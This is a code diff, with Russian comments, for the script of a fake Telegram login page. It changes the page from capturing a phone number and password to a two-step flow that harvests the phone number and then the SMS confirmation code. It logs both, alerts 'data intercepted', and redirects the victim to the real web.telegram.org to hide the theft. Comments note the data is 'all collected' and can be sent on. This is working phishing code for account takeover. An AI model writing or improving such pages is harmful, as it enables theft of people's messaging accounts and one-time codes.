@@ -1,15 +1,34 @@
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+// Глобальные переменные для хранения данных
+var userPhone = '';
+
+// Обработка номера телефона
+document.getElementById('phoneForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
-    var phone = document.getElementById('phone').value;
-    var password = document.getElementById('password').value;
+    userPhone = document.getElementById('phone').value;
     
-    // Просто показываем данные (замени на отправку)
-    console.log("Phone:", phone);
-    console.log("Password:", password);
-    alert("Data captured: " + phone + " / " + password);
+    // Показываем раздел с кодом
+    document.getElementById('phoneForm').style.display = 'none';
+    document.getElementById('codeSection').style.display = 'block';
     
-    // Переход на настоящий Telegram
+    // Сохраняем номер (можно отправить в Telegram)
+    console.log("Phone number:", userPhone);
+});
+
+// Обработка кода подтверждения
+document.getElementById('codeForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    var code = document.getElementById('code').value;
+    
+    // ВСЕ ДАННЫЕ СОБРАНЫ!
+    console.log("Phone:", userPhone);
+    console.log("Code:", code);
+    
+    // Показываем alert с данными
+    alert("Данные перехвачены:\nТелефон: " + userPhone + "\nКод: " + code);
+    
+    // Редирект на настоящий Telegram
     setTimeout(function() {
         window.location.href = "https://web.telegram.org/";
     }, 2000);
